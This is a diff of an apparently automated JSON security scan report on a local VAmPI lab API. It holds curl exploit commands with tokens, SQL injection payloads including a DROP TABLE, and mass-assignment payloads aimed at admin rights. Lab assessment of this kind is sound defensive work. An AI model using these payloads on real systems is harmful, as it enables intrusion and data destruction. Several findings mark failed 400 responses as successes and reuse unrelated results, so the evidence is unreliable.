+          "exploit_command": "curl -i -X PUT 'http://localhost:5000/users/v1/{username}/password' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODgxNzgwOTgsImlhdCI6MTc4ODE3ODAzOCwic3ViIjoiY29waWxvdF84ZTMzMDY0NyJ9.F_yTzSSejF9v_CXZINOlLzINRjDqPYzgSCPxPM2PX5U' -H 'x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODgxNzgwOTgsImlhdCI6MTc4ODE3ODAzOCwic3ViIjoiY29waWxvdF84ZTMzMDY0NyJ9.F_yTzSSejF9v_CXZINOlLzINRjDqPYzgSCPxPM2PX5U' -H 'X-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODgxNzgwOTgsImlhdCI6MTc4ODE3ODAzOCwic3ViIjoiY29waWxvdF84ZTMzMDY0NyJ9.F_yTzSSejF9v_CXZINOlLzINRjDqPYzgSCPxPM2PX5U' -H 'Content-Type: application/json' -d '{\"email\":\"test@example.com\\' OR \\'1\\'=\\'1\"}'",
+          "note": "Payload accepted without error \u2014 potential blind/stored SQL injection.",
+          "payloads_tested": [
+            "test@example.com' OR '1'='1",
+            "test@example.com\" OR \"1\"=\"1",
+            "test@example.com; DROP TABLE users; --"
+          ],
+          "poc_results": {
+            "sample_payloads": [
+              {
+                "payload": "' OR '1'='1",
+                "status": 400,
+                "success": true
+              },
+              {
+                "payload": "admin' --",
+                "status": 400,
+                "success": true
+              },
+              {
+                "payload": "' UNION SELECT username, password FROM users --",
+                "status": 400,
+                "success": true
+              }
+            ],
+            "successful": 4,
+            "total_attempts": 4
+          },
+          "sample_payload": "test@example.com' OR '1'='1",
+          "status": 200
+        },
+        "method": "PUT",
+        "owasp_category": "API8: Injection",
+        "proof_of_concept": "PUT /users/v1/copilot_8e330647/password with password=\"test@example.com' OR '1'='1\" and verify persistence.",
+        "remediation": "Use parameterized queries and validate that password fields reject SQL metacharacters.",
+        "severity": "high",
+        "title": "Password update endpoint accepts SQL injection payloads"
+      },
+      {
+        "cvss_score": 8.6,
+        "endpoint": "/users/v1/register",
+        "evidence": {
+          "exploit_command": "curl -i -X POST 'http://localhost:5000/users/v1/register' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODgxNzgwOTgsImlhdCI6MTc4ODE3ODAzOCwic3ViIjoiY29waWxvdF84ZTMzMDY0NyJ9.F_yTzSSejF9v_CXZINOlLzINRjDqPYzgSCPxPM2PX5U' -H 'x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODgxNzgwOTgsImlhdCI6MTc4ODE3ODAzOCwic3ViIjoiY29waWxvdF84ZTMzMDY0NyJ9.F_yTzSSejF9v_CXZINOlLzINRjDqPYzgSCPxPM2PX5U' -H 'X-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODgxNzgwOTgsImlhdCI6MTc4ODE3ODAzOCwic3ViIjoiY29waWxvdF84ZTMzMDY0NyJ9.F_yTzSSejF9v_CXZINOlLzINRjDqPYzgSCPxPM2PX5U' -H 'Content-Type: application/json' -d '{\"username\":\"demo\",\"email\":\"demo@example.com\",\"password\":\"Passw0rd!\",\"admin\":true}'",
+          "payload_keys": [
+            "admin",
+            "email",
+            "is_admin",
+            "password",
+            "permissions",
+            "role",
+            "username",
+            "verified"
+          ],
+          "poc_results": {
+            "sample_payloads": [
+              {
+                "payload": "{\"admin\": true, \"username\": \"hacker\", \"password\": \"hack123\"}",
+                "status": 400,
+                "success": false
+              },
+              {
+                "payload": "{\"role\": \"admin\", \"username\": \"pwned\", \"password\": \"pwned\"}",
+                "status": 400,
+                "success": false
+              },
+              {
+                "payload": "{\"is_admin\": true, \"username\": \"hijack\", \"password\": \"hijack\"}",
+                "status": 400,
+                "success": false
+              }
+            ],
+            "successful": 0,
+            "total_attempts": 3
+          },
+          "response": {
+            "message": "Successfully registered. Login to receive an auth token.",
+            "status": "success"
+          },
+          "status": 200
+        },
+        "method": "POST",
+        "owasp_category": "API6: Mass Assignment",
+        "proof_of_concept": "POST /users/v1/register with admin/is_admin/role fields and check whether they are accepted.",
+        "remediation": "Explicitly whitelist registration fields and discard any privilege-related request properties.",
+        "severity": "high",
+        "title": "Mass assignment allows privileged fields during registration"
+      },
+      {
         "cvss_score": 3.7,
         "endpoint": "/users/v1",
         "evidence": {
-          "exploit_command": "curl -i -X GET 'http://localhost:5000/users/v1' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODU3Mzc2MDgsImlhdCI6MTc4NTczNzU0OCwic3ViIjoiY29waWxvdF80Y2M0ZGYxYSJ9.0S4sWbh9tWyPRO6OpJhsVmoe1WTNWPlcmGALOuoHmUQ' -H 'x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODU3Mzc2MDgsImlhdCI6MTc4NTczNzU0OCwic3ViIjoiY29waWxvdF80Y2M0ZGYxYSJ9.0S4sWbh9tWyPRO6OpJhsVmoe1WTNWPlcmGALOuoHmUQ' -H 'X-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODU3Mzc2MDgsImlhdCI6MTc4NTczNzU0OCwic3ViIjoiY29waWxvdF80Y2M0ZGYxYSJ9.0S4sWbh9tWyPRO6OpJhsVmoe1WTNWPlcmGALOuoHmUQ'",
+          "exploit_command": "curl -i -X GET 'http://localhost:5000/users/v1' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODgxNzgwOTgsImlhdCI6MTc4ODE3ODAzOCwic3ViIjoiY29waWxvdF84ZTMzMDY0NyJ9.F_yTzSSejF9v_CXZINOlLzINRjDqPYzgSCPxPM2PX5U' -H 'x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODgxNzgwOTgsImlhdCI6MTc4ODE3ODAzOCwic3ViIjoiY29waWxvdF84ZTMzMDY0NyJ9.F_yTzSSejF9v_CXZINOlLzINRjDqPYzgSCPxPM2PX5U' -H 'X-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODgxNzgwOTgsImlhdCI6MTc4ODE3ODAzOCwic3ViIjoiY29waWxvdF84ZTMzMDY0NyJ9.F_yTzSSejF9v_CXZINOlLzINRjDqPYzgSCPxPM2PX5U'",
           "server": "Werkzeug/2.2.3 Python/3.11.15"
         },
         "method": "GET",
@@ -516,7 +801,7 @@
         "cvss_score": 8.0,
         "endpoint": "/createdb",
         "evidence": {
-          "exploit_command": "curl -i -X GET 'http://localhost:5000/createdb' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODU3Mzc2MDgsImlhdCI6MTc4NTczNzU0OCwic3ViIjoiY29waWxvdF80Y2M0ZGYxYSJ9.0S4sWbh9tWyPRO6OpJhsVmoe1WTNWPlcmGALOuoHmUQ' -H 'x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODU3Mzc2MDgsImlhdCI6MTc4NTczNzU0OCwic3ViIjoiY29waWxvdF80Y2M0ZGYxYSJ9.0S4sWbh9tWyPRO6OpJhsVmoe1WTNWPlcmGALOuoHmUQ' -H 'X-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODU3Mzc2MDgsImlhdCI6MTc4NTczNzU0OCwic3ViIjoiY29waWxvdF80Y2M0ZGYxYSJ9.0S4sWbh9tWyPRO6OpJhsVmoe1WTNWPlcmGALOuoHmUQ'",
+          "exploit_command": "curl -i -X GET 'http://localhost:5000/createdb' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODgxNzgwOTgsImlhdCI6MTc4ODE3ODAzOCwic3ViIjoiY29waWxvdF84ZTMzMDY0NyJ9.F_yTzSSejF9v_CXZINOlLzINRjDqPYzgSCPxPM2PX5U' -H 'x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODgxNzgwOTgsImlhdCI6MTc4ODE3ODAzOCwic3ViIjoiY29waWxvdF84ZTMzMDY0NyJ9.F_yTzSSejF9v_CXZINOlLzINRjDqPYzgSCPxPM2PX5U' -H 'X-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODgxNzgwOTgsImlhdCI6MTc4ODE3ODAzOCwic3ViIjoiY29waWxvdF84ZTMzMDY0NyJ9.F_yTzSSejF9v_CXZINOlLzINRjDqPYzgSCPxPM2PX5U'",
           "response_excerpt": "{ \"message\": \"Database populated.\" }",
           "status": 200
         },
@@ -531,7 +816,7 @@
         "cvss_score": 4.0,
         "endpoint": "/books/v1",
         "evidence": {
-          "exploit_command": "curl -i -X GET 'http://localhost:5000/books/v1' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODU3Mzc2MDgsImlhdCI6MTc4NTczNzU0OCwic3ViIjoiY29waWxvdF80Y2M0ZGYxYSJ9.0S4sWbh9tWyPRO6OpJhsVmoe1WTNWPlcmGALOuoHmUQ' -H 'x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODU3Mzc2MDgsImlhdCI6MTc4NTczNzU0OCwic3ViIjoiY29waWxvdF80Y2M0ZGYxYSJ9.0S4sWbh9tWyPRO6OpJhsVmoe1WTNWPlcmGALOuoHmUQ' -H 'X-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODU3Mzc2MDgsImlhdCI6MTc4NTczNzU0OCwic3ViIjoiY29waWxvdF80Y2M0ZGYxYSJ9.0S4sWbh9tWyPRO6OpJhsVmoe1WTNWPlcmGALOuoHmUQ'",
+          "exploit_command": "curl -i -X GET 'http://localhost:5000/books/v1' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODgxNzgwOTgsImlhdCI6MTc4ODE3ODAzOCwic3ViIjoiY29waWxvdF84ZTMzMDY0NyJ9.F_yTzSSejF9v_CXZINOlLzINRjDqPYzgSCPxPM2PX5U' -H 'x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODgxNzgwOTgsImlhdCI6MTc4ODE3ODAzOCwic3ViIjoiY29waWxvdF84ZTMzMDY0NyJ9.F_yTzSSejF9v_CXZINOlLzINRjDqPYzgSCPxPM2PX5U' -H 'X-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODgxNzgwOTgsImlhdCI6MTc4ODE3ODAzOCwic3ViIjoiY29waWxvdF84ZTMzMDY0NyJ9.F_yTzSSejF9v_CXZINOlLzINRjDqPYzgSCPxPM2PX5U'",
           "response_type": "dict",
           "status": 200
         },
@@ -543,10 +828,70 @@
         "title": "Collection endpoint lacks pagination or consumption controls"
       },
       {
+        "cvss_score": 9.3,
+        "endpoint": "/users/v1/{username}/password",
+        "evidence": {
+          "exploit_command": "curl -i -X PUT 'http://localhost:5000/users/v1/{username}/password' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODgxNzgwOTgsImlhdCI6MTc4ODE3ODAzOCwic3ViIjoiY29waWxvdF84ZTMzMDY0NyJ9.F_yTzSSejF9v_CXZINOlLzINRjDqPYzgSCPxPM2PX5U' -H 'x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODgxNzgwOTgsImlhdCI6MTc4ODE3ODAzOCwic3ViIjoiY29waWxvdF84ZTMzMDY0NyJ9.F_yTzSSejF9v_CXZINOlLzINRjDqPYzgSCPxPM2PX5U' -H 'X-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODgxNzgwOTgsImlhdCI6MTc4ODE3ODAzOCwic3ViIjoiY29waWxvdF84ZTMzMDY0NyJ9.F_yTzSSejF9v_CXZINOlLzINRjDqPYzgSCPxPM2PX5U'",
+          "payload": {
+            "password": "CrossUser!123"
+          },
+          "poc_results": {
+            "sample_payloads": [
+              {
+                "payload": "' OR '1'='1",
+                "status": 400,
+                "success": true
+              },
+              {
+                "payload": "admin' --",
+                "status": 400,
+                "success": true
+              },
+              {
+                "payload": "' UNION SELECT username, password FROM users --",
+                "status": 400,
+                "success": true
+              }
+            ],
+            "successful": 4,
+            "total_attempts": 4
+          },
+          "status": 204,
+          "target_username": "name1"
+        },
+        "method": "PUT",
+        "owasp_category": "API2: Broken Authentication",
+        "proof_of_concept": "PUT /users/v1/name1/password with another user's token.",
+        "remediation": "Bind profile updates to the authenticated subject and reject cross-user modifications unless the caller is an admin.",
+        "severity": "critical",
+        "title": "Authentication bypass allows cross-user profile updates"
+      },
+      {
         "cvss_score": 4.3,
         "endpoint": "/users/v1/login",
         "evidence": {
-          "exploit_command": "curl -i -X POST 'http://localhost:5000/users/v1/login' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODU3Mzc2MDgsImlhdCI6MTc4NTczNzU0OCwic3ViIjoiY29waWxvdF80Y2M0ZGYxYSJ9.0S4sWbh9tWyPRO6OpJhsVmoe1WTNWPlcmGALOuoHmUQ' -H 'x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODU3Mzc2MDgsImlhdCI6MTc4NTczNzU0OCwic3ViIjoiY29waWxvdF80Y2M0ZGYxYSJ9.0S4sWbh9tWyPRO6OpJhsVmoe1WTNWPlcmGALOuoHmUQ' -H 'X-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODU3Mzc2MDgsImlhdCI6MTc4NTczNzU0OCwic3ViIjoiY29waWxvdF80Y2M0ZGYxYSJ9.0S4sWbh9tWyPRO6OpJhsVmoe1WTNWPlcmGALOuoHmUQ'",
+          "exploit_command": "curl -i -X POST 'http://localhost:5000/users/v1/login' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODgxNzgwOTgsImlhdCI6MTc4ODE3ODAzOCwic3ViIjoiY29waWxvdF84ZTMzMDY0NyJ9.F_yTzSSejF9v_CXZINOlLzINRjDqPYzgSCPxPM2PX5U' -H 'x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODgxNzgwOTgsImlhdCI6MTc4ODE3ODAzOCwic3ViIjoiY29waWxvdF84ZTMzMDY0NyJ9.F_yTzSSejF9v_CXZINOlLzINRjDqPYzgSCPxPM2PX5U' -H 'X-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODgxNzgwOTgsImlhdCI6MTc4ODE3ODAzOCwic3ViIjoiY29waWxvdF84ZTMzMDY0NyJ9.F_yTzSSejF9v_CXZINOlLzINRjDqPYzgSCPxPM2PX5U'",
+          "poc_results": {
+            "sample_payloads": [
+              {
+                "payload": "{\"test\": \"empty secret decode\"}",
+                "status": 200,
+                "success": true
+              },
+              {
+                "payload": "{\"test\": \"common weak secret\"}",
+                "status": 200,
+                "success": true
+              },
+              {
+                "payload": "{\"test\": \"algorithm confusion\"}",
+                "status": 200,
+                "success": true
+              }
+            ],
+            "successful": 6,
+            "total_attempts": 6
+          },
           "status_codes": [
             200,
             200,
@@ -565,13 +910,13 @@
     ],
     "notes": [
       "Assessment is scoped to the local VAmPI instance only.",
-      "Tested DELETE /users/v1/{user_id} with user_id=1; status=500.",
-      "Tested PUT /users/v1/{user_id}/password with statuses=[400, 400, 400].",
-      "Tested GET /books/v1/{book_title} using book_title='bookTitle3'; status=200."
+      "Tested DELETE /users/v1/{username} with target=name1; status=500.",
+      "Tested PUT /users/v1/{username}/password with statuses=[400, 400, 400].",
+      "Tested GET /books/v1/{book_title} using book_title='bookTitle62'; status=200."
     ],
     "risk_summary": {
-      "critical": 1,
-      "high": 2,
+      "critical": 4,
+      "high": 5,
       "info": 0,
       "low": 4,
       "medium": 0
@@ -654,16 +999,6 @@
         "auth_required": true,
         "category": "user-management",
         "method": "DELETE",
-        "parameters": [],
-        "path": "/users/v1/{user_id}",
-        "risk": "high",
-        "source": "fallback",
-        "summary": "Delete a user account"
-      },
-      {
-        "auth_required": true,
-        "category": "user-management",
-        "method": "DELETE",
         "parameters": [
           {
             "in": "path",
@@ -699,16 +1034,6 @@
         "risk": "medium",
         "source": "openapi",
         "summary": "Retrieves all details for all users"
-      },
-      {
-        "auth_required": true,
-        "category": "user-management",
-        "method": "GET",
-        "parameters": [],
-        "path": "/users/v1/{user_id}",
-        "risk": "medium",
-        "source": "fallback",
-        "summary": "Get user details"
       },
       {
         "auth_required": false,
@@ -749,26 +1074,6 @@
         "risk": "high",
         "source": "openapi",
         "summary": "Register new user"
-      },
-      {
-        "auth_required": true,
-        "category": "user-management",
-        "method": "PUT",
-        "parameters": [],
-        "path": "/users/v1/{user_id}/email",
-        "risk": "high",
-        "source": "fallback",
-        "summary": "Update a user email"
-      },
-      {
-        "auth_required": true,
-        "category": "user-management",
-        "method": "PUT",
-        "parameters": [],
-        "path": "/users/v1/{user_id}/password",
-        "risk": "high",
-        "source": "fallback",
-        "summary": "Update a user password"
       },
       {
         "auth_required": true,
